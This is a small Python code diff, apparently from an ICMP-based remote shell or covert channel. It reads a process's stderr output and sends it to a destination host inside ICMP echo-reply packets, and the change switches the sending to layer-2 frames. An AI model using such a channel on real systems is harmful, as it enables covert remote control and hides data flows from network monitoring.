@@ -32,9 +32,9 @@ def readstderr():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = IP(dst=destination_ip) / ICMP(type=0,
+        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=0,
                                                      id=config.ID) / string
-        send(reply_packet, verbose=False)
+        sendp(reply_packet, verbose=False)
         sys.stderr.write(string + "\n")
 
 
